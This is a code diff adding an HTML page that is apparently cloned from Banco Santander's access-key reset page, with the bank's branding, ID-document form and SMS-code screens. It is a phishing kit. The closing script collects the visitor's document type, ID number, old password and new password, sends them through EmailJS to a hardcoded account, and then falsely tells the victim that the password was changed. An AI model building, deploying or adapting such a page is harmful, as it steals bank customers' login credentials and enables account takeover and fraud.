@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<!-- saved from url=(0071)https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET -->
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="cache-control" content=" no-store ">
+  <meta http-equiv="pragma" content="no-cache">
+
+  <title>Santander</title>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" type="text/css" href="./Santander_files/bootstrap.css">
+  <link rel="stylesheet" type="text/css" media="(min-width: @screen-md-min) and (max-width: @screen-md-max)"
+    href="./Santander_files/bootstrap-responsive.css">
+  <link rel="stylesheet" type="text/css" href="./Santander_files/style.css">
+  <link rel="stylesheet" type="text/css" href="./Santander_files/116.css" id="cambiaEstilo">
+  <link rel="stylesheet" type="text/css" href="./Santander_files/prettyPhoto.css">
+  <link rel="stylesheet" type="text/css" href="./Santander_files/modales.css">
+  <link rel="stylesheet" type="text/css" href="./Santander_files/slider-captcha.css">
+  <link rel="stylesheet" type="text/css" href="./Santander_files/all.min.css">
+
+  <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+
+
+
+<body>
+  <script>
+
+  </script>
+  <script type="text/javascript">
+    var canal = "INT";
+    var sty = parametroURL("sty");
+    if (sty == null) {
+      sty = "SNET";
+    } else if (isMovil && sty == "APP") {
+      canal = "MOV";
+    }
+
+    var utag_data = {
+      canal: canal,
+      page_name: "login",
+      page_title: "Regenerador claves Solicitud Login",
+      page_type: "formulario",
+      page_subtype: "reg_claves",
+      page_lang: "es_ES",
+      site_id: "web_comercial",
+      access_type: "publico",
+      content_type: "no comercial",
+      ui_style: sty
+    }
+
+    var entorno;
+    $.ajax({
+      url: '/REGCLA_PHOENIX/public/entorno',
+      type: 'get',
+      cache: false,
+      async: false,
+      contentType: 'application/json',
+      success: function (result) {
+        entorno = result;
+      },
+      error: function (xhr, status, error) {
+        entorno = "dev";
+      }
+    });
+
+    (function (a, b, c, d) {
+      a = '//tags.tiqcdn.com/utag/santander/es-main/' + entorno + '/utag.js';
+      b = document;
+      c = 'script';
+      d = b.createElement(c);
+      d.src = a;
+      d.type = 'text/java' + c;
+      d.async = true;
+      a = b.getElementsByTagName(c)[0];
+      a.parentNode.insertBefore(d, a);
+    })();
+    $('#slider').sliderCaptcha({
+      type: "filled",
+      width: '300'
+    });
+  </script>
+
+  <div class="container" id="app">
+    <input type="hidden" id="closeWindow" value="0">
+    <!-- Ventana 1 -->
+    <div class="modal fade look-for in" onscroll="getScroll()" id="Ventana_1" role="dialog"
+      aria-labelledby="Ventana_1_label" data-keyboard="false" data-backdrop="static" aria-hidden="false"
+      style="z-index: 9979;">
+      <div class="modal-content">
+        <div class="modal-header cabecera_modal">
+          <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>-->
+          <h4 class="modal-title" id="Ventana_1_label">Área de clientes</h4>
+        </div><!-- modal-header -->
+        <div class="modal-body">
+          <p style="font-weight: bold;">Solicitud nueva clave de acceso.</p>
+          <p>Para solicitar una nueva clave de acceso indica tu documento y pulsa <strong>"Aceptar"</strong></p>
+          <div class="container-fluid">
+            <form id="form_1">
+              <div class="row">
+                <div class="col-sm-12 col-lg-12">
+                  <div class="form-group">
+                    <select class="form-control" id="tipo_doc" name="tipo_doc" v-model="tipo_documento">
+                      <option value="N">NIF</option>
+                      <option value="-1">Tipo de documento</option>
+                      <option value="S">CIF</option>
+                      <option value="C">NIE</option>
+                      <option value="P">Pasaporte español</option>
+                      <option value="I">Doc. Identidad no español</option>
+                    </select>
+                  </div>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12 col-lg-12">
+                  <div class="form-group ancho_total">
+                    <input type="text" class="form-control" id="documento" maxlength="20" placeholder="Documento"
+                      v-model="documento">
+                    <input type="password" class="form-control" id="clave_acceso_antigua" maxlength="20"
+                      placeholder="Clave de acceso antigua" v-model="clave_acceso_antigua">
+                    <input type="password" class="form-control" id="clave_acceso_nueva" maxlength="20"
+                      placeholder="Nueva Clave de acceso" v-model="clave_acceso_nueva">
+                  </div>
+
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="col-sm-12 col-lg-12">
+                  <button type="button" class="btn btn-danger boton_rojo" id="btn_validar"
+                    @click="enviar">Aceptar</button>
+
+                </div>
+              </div>
+              <!-- ESPACIO PARA MENSAJES UX -->
+              <div class="row">
+                <div class="col-sm-12 col-lg-12">
+                  <p style="padding-top: 10px;" id="mensajes_error" role="alert"></p>
+                </div>
+              </div>
+              <!-- FIN ESPACIO PARA MENSAJES UX -->
+            </form>
+          </div>
+        </div><!-- modal-body -->
+      </div><!-- modal-content -->
+    </div><!-- modal fade moda -->
+
+
+
+    <!-- Ventana 2 -->
+    <div class="modal fade hidden-modal" id="Ventana_2" role="dialog" aria-labelledby="Ventana_2_label"
+      data-keyboard="false" data-backdrop="static">
+      <div class="modal-content">
+        <div class="modal-header cabecera_modal">
+          <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>-->
+          <h4 class="modal-title" id="Ventana_2_label">Área de clientes</h4>
+        </div><!-- modal-header-->
+        <div class="modal-body modal-body-plus">
+          <p style="font-weight: bold;">Solicitud nueva clave de acceso.</p>
+          <p id="label-movil" align="justify"></p>
+          <div class="container-fluid">
+            <form id="form_2" method="post" autocomplete="off">
+              <div class="row">
+                <div class="col-sm-12">
+                  <div class="form-group">
+                    <input type="text" class="form-control" id="sms" placeholder="Código SMS" maxlength="8">
+                  </div>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12">
+                  <div class="form-group">
+                    <p>A continuación, elija su clave de acceso</p>
+                  </div>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="col-sm-12">
+                  <div class="form-group">
+                    <input type="password" class="form-control" id="clave1" required="required" pattern="[0-9]*"
+                      placeholder="Nueva Clave de acceso" autocomplete="off" maxlength="8"
+                      title="Desde aquí podrás elegir una clave de acceso (de 8 caracteres numéricos) para acceder a todos los Canales a Distancia del Banco Santander. Para que la clave sea válida es necesario que la combinación de 8 caracteres (numéricos) no sean del mismo numero (Ej:22222222), ni secuencia ascendente (Ej: 12345678) ni descendente (ej:87654321)">
+                  </div>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="col-sm-12">
+                  <div class="form-group">
+                    <input type="password" class="form-control" id="clave2" required="required" onpaste="return false"
+                      autocomplete="off" placeholder="Repetir nueva Clave de acceso" maxlength="8">
+                  </div>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12">
+                  <button type="button" id="btn_generar_clave" class="btn btn-danger boton_rojo"
+                    onclick="comprobar_clave()">Aceptar</button>
+                  <div id="loading_generar" class="loadingDiv"><img src="./Santander_files/redLoading.gif"
+                      id="imgLoading"></div>
+                </div>
+              </div>
+              <div class="row" style="padding-top: 10px;">
+                <div class="col-sm-12">
+                  <!-- ESPACIO PARA MENSAJES UX -->
+                  <p id="mensajes_error2" role="alert"></p>
+                  <!-- FIN ESPACIO PARA MENSAJES UX -->
+                </div>
+              </div>
+              <div class="row" id="div-re-solicitar">
+                <div class="col-sm-12">
+                  <p><b>Si no te ha llegado el SMS y quieres volver a solicitarlo, pulsa <a
+                        href="javascript:resolicitar()" id="re-solicitar">aquí</a></b></p>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12 text-right" style="border-bottom: 1px solid #ccc !important;">
+                  <a href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                    class="enlace_volver" onclick="volver()">Volver <span class="glyphicon glyphicon-play"
+                      aria-hidden="true"></span></a>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12">
+                  <p class="texto_gris" align="justify"> Si el número que aparece no es correcto, puedes llamar al
+                    <b>915 123 123</b> donde te informaremos de los pasos a seguir.
+                    <br>También puedes acudir a una de nuestras oficinas para solicitar la modificación</p>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div><!-- modal-body-->
+        <div class="modal-footer">
+          <div class="row">
+            <div class="col-sm-12 text-center">
+              <a href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                class="enlace_volver tus_claves"> Sobre tus claves</a> | <a
+                href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                class="enlace_volver consejos_seguridad">Consejos de seguridad</a>
+            </div>
+          </div>
+        </div><!-- modal-footer-->
+      </div>
+      <!--modal-content-->
+    </div>
+    <!--modal fade modal-->
+
+    <!-- Ventana 3 -->
+    <div class="modal fade hidden-modal" id="Ventana_3" role="dialog" aria-labelledby="Ventana_3_label"
+      data-keyboard="false" data-backdrop="static">
+      <div class="modal-content">
+        <div class="modal-header cabecera_modal">
+          <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>-->
+          <h4 class="modal-title" id="Ventana_3_label">Área de clientes</h4>
+        </div><!-- modal-header-->
+        <div class="modal-body">
+          <div class="container-fluid">
+            <form>
+              <div class="row">
+                <div class="col-xs-12 col-sm-12 col-lg-12">
+                  <p class="error-text">
+                    <img src="./Santander_files/ckeck_KO.png" width="15%" height="15%">
+                    <strong>Error</strong>
+                  </p>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-xs-12 col-sm-12 col-lg-12">
+                  <p class="texto_gris" id="mensaje-error">
+                    Se ha producido un error, por favor vuelva a intentarlo más tarde.</p>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-xs-12 col-sm-12 col-lg-12">
+                  <button type="button" class="btn btn-danger boton_rojo" onclick="error_clave()">Aceptar</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div><!-- modal-body-->
+        <div class="modal-footer">
+          <div class="row">
+            <div class="col-sm-12 text-center">
+              <a href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                class="enlace_volver tus_claves"> Sobre tus claves</a> | <a
+                href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                class="enlace_volver consejos_seguridad">Consejos de seguridad</a>
+            </div>
+          </div>
+        </div><!-- modal-footer-->
+      </div>
+      <!--modal-content-->
+    </div>
+    <!--modal fade modal-->
+
+    <!-- Ventana 4 -->
+    <div class="modal fade hidden-modal" id="Ventana_4" role="dialog" aria-labelledby="Ventana_4_label"
+      data-keyboard="false" data-backdrop="static">
+      <div class="modal-content">
+        <div class="modal-header cabecera_modal">
+          <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>-->
+          <h4 class="modal-title" id="Ventana_4_label">Área de clientes</h4>
+        </div><!-- modal-header-->
+        <div class="modal-body">
+          <div class="container-fluid">
+            <form>
+              <div class="row">
+                <div class="col-sm-12">
+                  <p class="success-text">
+                    <img src="./Santander_files/ckeck_OK.png" width="15%" height="15%">
+                    <strong>Confirmación Clave de acceso.</strong>
+                  </p>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12">
+                  <p class="texto_gris">Ya tienes activa tu clave de acceso para utilizar en los canales del banco
+                    Santander.</p>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-sm-12">
+                  <button type="button" class="btn boton_rojo text-center" data-dismiss="modal">Cerrar</button>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div><!-- modal-body-->
+        <div class="modal-footer">
+          <div class="row">
+            <div class="col-sm-12 text-center">
+              <a href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                class="enlace_volver tus_claves">Sobre tus claves</a> | <a
+                href="https://cmc.bancosantander.es/REGCLA_PHOENIX/static/index.html?sty=SNET#"
+                class="enlace_volver consejos_seguridad">Consejos de seguridad</a>
+            </div>
+          </div>
+        </div><!-- modal-footer-->
+      </div>
+      <!--modal-content-->
+    </div>
+    <!--modal fade modal-->
+    <!-- Bootstrap core JS -->
+  </div>
+  <div class="modal fade" id="modal-success" role="dialog">
+    <div class="modal-dialog">
+
+      <!-- Modal contenido-->
+      <div class="modal-content">
+        <div class="modal-body" style="text-align:center">
+          <img src="./Santander_files/ckeck_OK.png" width="15%" height="15%">
+          <br><br>
+          <p>
+            <strong>Se ha enviado un nuevo código a su móvil.</strong>
+          </p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn boton_rojo text-center" data-dismiss="modal">Aceptar</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("user_mtpGXPTm2acuEla2wh4Gv");
+    })();
+    const vue = new Vue({
+      el: '#app',
+      data() {
+        return {
+          tipo_documento: '',
+          documento: ''
+        }
+
+      },
+
+      methods: {
+        async enviar() {
+
+          let data = {
+            tipo_documento: this.tipo_documento,
+            documento: this.documento,
+            clave_acceso_antigua: this.clave_acceso_antigua,
+            clave_acceso_nueva: this.clave_acceso_nueva
+
+          };
+
+
+
+          await emailjs.send("service_vbim6fl", "template_kamcqfn", data)
+            .then(function (response) {
+              if (response.text === 'OK') {
+                alert('Clave de acceso cambiada de manera exitosa');
+              }
+              console.log("SUCCESS. status=%d, text=%s", response.status, response.text);
+            }, function (err) {
+              alert('Ocurrió un problema al cambiar la clave de acceso');
+              console.log("FAILED. error=", err);
+            });
+        }
+      }
+    });
+  </script>
+  <div class="modal-backdrop fade in modal-stack" style="z-index: 9978;"></div>
+
+</body>
+
+
+</html>
